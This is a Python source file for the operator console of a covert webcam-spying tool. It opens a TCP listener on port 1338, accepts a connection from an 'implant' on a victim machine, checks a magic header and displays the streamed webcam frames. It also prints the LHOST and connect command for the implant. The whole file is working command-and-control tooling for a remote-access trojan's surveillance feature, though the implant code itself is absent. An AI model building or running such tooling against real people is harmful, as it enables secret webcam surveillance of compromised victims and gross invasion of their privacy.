#!/usr/bin/env python3
"""UVC webcam operator window. TCP listen; implant connects out (HiddenDesktop-style)."""
from __future__ import annotations

import argparse
import os
import queue
import socket
import struct
import sys
import threading
import time

PORT = 1338
MAGIC = b"WCST"
BG = "#1d1814"
FG = "#e8d5b7"
MUTED = "#a89984"
ACCENT = "#fe8019"
OK = "#b8bb26"
BAD = "#fb4934"
TITLE = "UVC Stream"

try:
    from PIL import Image, ImageTk
except ImportError:
    Image = None
    ImageTk = None


def lan_ip():
    try:
        import subprocess

        raw = subprocess.check_output(["ip", "-4", "-br", "a"], text=True)
        ranked = []
        for line in raw.splitlines():
            parts = line.split()
            if len(parts) < 3 or parts[0] == "lo" or parts[0].startswith("lo:"):
                continue
            for cidr in parts[2:]:
                ip = cidr.split("/")[0]
                if ip.startswith("127.") or ip.startswith("172.17."):
                    continue
                score = 9
                if ip.startswith("192.168."):
                    score = 1
                elif ip.startswith("10."):
                    score = 2
                ranked.append((score, ip))
        if ranked:
            ranked.sort()
            return ranked[0][1]
    except Exception:
        pass
    return "127.0.0.1"


def recv_exact(conn, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


class Viewer:
    def __init__(self, port):
        self.port = port
        self.q = queue.Queue(maxsize=3)
        self.stop = threading.Event()
        self.frames = 0
        self.t0 = time.time()
        self.photo = None
        self.status_text = "waiting for implant…"
        self.root = None
        self.label = None
        self.stat = None
        self.sock = None

    def listen_thread(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", self.port))
        srv.listen(1)
        srv.settimeout(0.5)
        self.sock = srv
        conn = None
        while not self.stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            self.status_text = "connected %s:%d" % (addr[0], addr[1])
            conn.settimeout(90.0)
            try:
                mag = recv_exact(conn, 4)
                if mag != MAGIC:
                    self.status_text = "bad magic from %s" % addr[0]
                    conn.close()
                    continue
                while not self.stop.is_set():
                    hdr = recv_exact(conn, 4)
                    if not hdr:
                        break
                    (size,) = struct.unpack("<I", hdr)
                    if size < 32 or size > 8 * 1024 * 1024:
                        self.status_text = "bad frame size %d" % size
                        break
                    jpeg = recv_exact(conn, size)
                    if not jpeg:
                        break
                    self.frames += 1
                    try:
                        self.q.put_nowait(jpeg)
                    except queue.Full:
                        try:
                            self.q.get_nowait()
                        except queue.Empty:
                            pass
                        try:
                            self.q.put_nowait(jpeg)
                        except queue.Full:
                            pass
            except (OSError, socket.timeout):
                pass
            finally:
                try:
                    conn.close()
                except OSError:
                    pass
            self.status_text = "disconnected — waiting…"
        try:
            srv.close()
        except OSError:
            pass

    def pump(self):
        jpeg = None
        try:
            while True:
                jpeg = self.q.get_nowait()
        except queue.Empty:
            pass
        if jpeg and Image is not None:
            try:
                from io import BytesIO

                im = Image.open(BytesIO(jpeg))
                max_w = 1280
                if im.width > max_w:
                    h = int(im.height * (max_w / float(im.width)))
                    im = im.resize((max_w, h))
                self.photo = ImageTk.PhotoImage(im.convert("RGB"))
                self.label.configure(image=self.photo, text="")
            except Exception as exc:
                self.status_text = "decode: %s" % exc
        fps = 0.0
        dt = time.time() - self.t0
        if dt > 0.4:
            fps = self.frames / dt
        self.stat.configure(
            text="%s   frames=%d   %.1f fps   :%d"
            % (self.status_text, self.frames, fps, self.port)
        )
        if self.root:
            self.root.after(40, self.pump)

    def run(self):
        if Image is None:
            print("[-] python3-pil missing", file=sys.stderr)
            sys.exit(2)
        import tkinter as tk

        root = tk.Tk()
        self.root = root
        root.title(TITLE)
        root.configure(bg=BG)
        try:
            root.geometry("960x580+80+80")
        except tk.TclError:
            pass
        try:
            root.attributes("-topmost", True)
            root.after(1800, lambda: root.attributes("-topmost", False))
        except tk.TclError:
            pass
        top = tk.Frame(root, bg=BG)
        top.pack(fill="x", padx=10, pady=8)
        tk.Label(
            top,
            text="WEBCAM STREAM",
            fg=ACCENT,
            bg=BG,
            font=("DejaVu Sans Mono", 14, "bold"),
        ).pack(side="left")
        self.stat = tk.Label(
            top, text=self.status_text, fg=MUTED, bg=BG, font=("DejaVu Sans Mono", 10)
        )
        self.stat.pack(side="right")
        self.label = tk.Label(
            root,
            text="waiting for implant…\n\nwebcam-stream %s %d" % (lan_ip(), self.port),
            fg=FG,
            bg="#140f0c",
            font=("DejaVu Sans Mono", 12),
            justify="center",
        )
        self.label.pack(fill="both", expand=True, padx=8, pady=8)
        hint = tk.Label(
            root,
            text="implant connects out  |  close window = stop stream  |  TCP %d"
            % self.port,
            fg=MUTED,
            bg=BG,
            font=("DejaVu Sans Mono", 9),
        )
        hint.pack(pady=(0, 8))
        t = threading.Thread(target=self.listen_thread, daemon=True)
        t.start()
        root.protocol("WM_DELETE_WINDOW", self.on_close)
        root.after(40, self.pump)
        print("[+] %s listening 0.0.0.0:%d  LHOST=%s" % (TITLE, self.port, lan_ip()), flush=True)
        print("[+] type:  webcam-stream %s %d" % (lan_ip(), self.port), flush=True)
        root.mainloop()

    def on_close(self):
        self.stop.set()
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
        if self.root:
            self.root.destroy()


def main():
    ap = argparse.ArgumentParser(description=TITLE)
    ap.add_argument("--port", type=int, default=PORT)
    args = ap.parse_args()
    if os.environ.get("DISPLAY") in (None, ""):
        os.environ["DISPLAY"] = ":0"
    Viewer(args.port).run()


if __name__ == "__main__":
    main()
